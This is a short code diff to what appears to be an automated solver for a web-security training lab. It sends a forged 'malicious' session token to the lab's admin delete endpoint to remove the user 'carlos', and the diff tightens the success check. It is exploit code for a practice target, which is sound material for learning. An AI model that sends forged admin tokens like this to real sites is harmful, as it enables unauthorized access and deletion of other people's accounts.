@@ -34,7 +34,7 @@ class Solver:
     def delete_the_user(self):
         cookies = {'session': self.generate_malicious_token()}
         response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
-        if 'carlos' not in response.text:
+        if 'wiener' in response.text and 'carlos' not in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
             print('My GitHub account: https://github.com/ma4747gh')
